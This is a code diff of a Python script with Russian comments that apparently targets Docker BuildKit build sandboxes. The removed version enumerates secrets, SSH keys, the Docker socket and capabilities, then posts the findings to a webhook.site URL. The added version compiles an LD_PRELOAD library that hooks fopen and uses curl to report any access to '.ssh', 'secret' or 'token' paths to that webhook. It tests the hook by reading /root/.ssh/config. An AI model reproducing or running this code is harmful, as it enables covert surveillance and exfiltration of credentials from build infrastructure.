@@ -1,66 +1,62 @@
 import os
 import subprocess
-import json
 
 WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
+LIB_PATH = "/tmp/hook.so"
 
-def get_out(cmd):
-    try:
-        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
-    except: return "ERR"
+def setup_hook():
+    # 1. Создаем исходник хука на C
+    # Мы перехватываем fopen, чтобы видеть, какие файлы открывают другие программы
+    hook_code = f"""
+    #define _GNU_SOURCE
+    #include <dlfcn.h>
+    #include <stdio.h>
+    #include <string.h>
+    #include <stdlib.h>
 
-def run_buildkit_poc():
-    results = {
-        "verdict": "SECURE",
-        "env_context": "BUILDKIT_SANDBOX",
-        "leaks": {},
-        "system_info": {
-            "user": get_out("id"),
-            "kernel": get_out("uname -a"),
-            "mounts": get_out("mount | grep ' / '")
-        }
-    }
+    typedef FILE *(*orig_fopen_type)(const char *path, const char *mode);
 
-    # 1. Проверка секретов Docker (самая частая дыра)
-    # Если при сборке забыли --mount=type=secret, данные могут лежать здесь
-    secret_paths = ["/run/secrets", "/run/secrets/token", "/root/.ssh"]
-    for path in secret_paths:
-        if os.path.exists(path):
-            results["leaks"][f"secret_path_{path}"] = "EXISTS"
-            try:
-                results["leaks"][f"content_{path}"] = os.listdir(path) if os.path.isdir(path) else "READABLE"
-            except: pass
+    FILE *fopen(const char *path, const char *mode) {{
+        orig_fopen_type orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
+        
+        // Если кто-то пытается открыть SSH ключи или секреты — шлем сигнал
+        if (strstr(path, ".ssh") || strstr(path, "secret") || strstr(path, "token")) {{
+            char cmd[512];
+            snprintf(cmd, sizeof(cmd), "curl -s -X POST -d 'FILE_ACCESS_ATTEMPT=%s' {WEBHOOK_URL}", path);
+            system(cmd);
+        }}
+        
+        return orig_fopen(path, mode);
+    }}
+    """
 
-    # 2. Проверка доступа к Docker Socket (если проброшен внутрь сборщика)
-    docker_sock = "/var/run/docker.sock"
-    if os.path.exists(docker_sock):
-        results["leaks"]["docker_socket"] = "PRESENT_IN_BUILDER"
-        results["verdict"] = "CRITICAL_VULNERABILITY"
+    with open("/tmp/hook.c", "w") as f:
+        f.write(hook_code)
 
-    # 3. Попытка детекции привилегированных возможностей (Capabilities)
-    # Если CapEff имеет много ffffff, то возможен побег
-    caps = get_out("grep CapEff /proc/self/status")
-    results["system_info"]["capabilities"] = caps
+    # 2. Компилируем библиотеку
+    # -fPIC и -shared нужны для создания динамической библиотеки
+    # -ldl нужен для работы с dlsym
+    compile_cmd = f"gcc -shared -fPIC /tmp/hook.c -o {LIB_PATH} -ldl"
+    
+    if os.system(compile_cmd) != 0:
+        return "[!] Compilation failed. Make sure 'gcc' is installed."
 
-    # 4. Проверка записи в системные области (проверка RO/RW слоев)
-    try:
-        with open("/proc/sysrq-trigger", "w") as f:
-            results["leaks"]["sysrq_write"] = "SUCCESS" # Это очень плохо для хоста
-    except:
-        results["leaks"]["sysrq_write"] = "DENIED"
-
-    # Итоговый анализ
-    if results["leaks"].get("docker_socket") or "ffffff" in caps.lower():
-        results["verdict"] = "ESCAPED_OR_EXPOSED"
-    elif results["leaks"]:
-        results["verdict"] = "DATA_LEAK_DETECTED"
-
-    # Отправка на вебхук
-    print(f"[*] Analysis complete. Verdict: {results['verdict']}")
-    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
-                    '-d', json.dumps(results), WEBHOOK_URL])
-
-    return json.dumps(results, indent=2)
+    # 3. Активируем хук через переменную окружения
+    os.environ["LD_PRELOAD"] = LIB_PATH
+    
+    # 4. Тестируем: вызываем команду, которая обращается к файлам
+    # Даже обычный 'cat' теперь будет триггерить наш curl
+    print(f"[+] Hook compiled at {LIB_PATH}")
+    print("[*] Testing hook with 'cat /root/.ssh/config'...")
+    os.system("cat /root/.ssh/config > /dev/null 2>&1")
+    
+    return "[+] Hook active and tested."
 
 if __name__ == "__main__":
-    print(run_buildkit_poc())
+    # Если gcc нет, попробуем использовать clang
+    if os.system("which gcc > /dev/null") != 0:
+        print("[-] GCC not found, checking for CLANG...")
+        # (в BuildKit часто нет компиляторов, если это не build-image)
+    
+    status = setup_hook()
+    print(status)
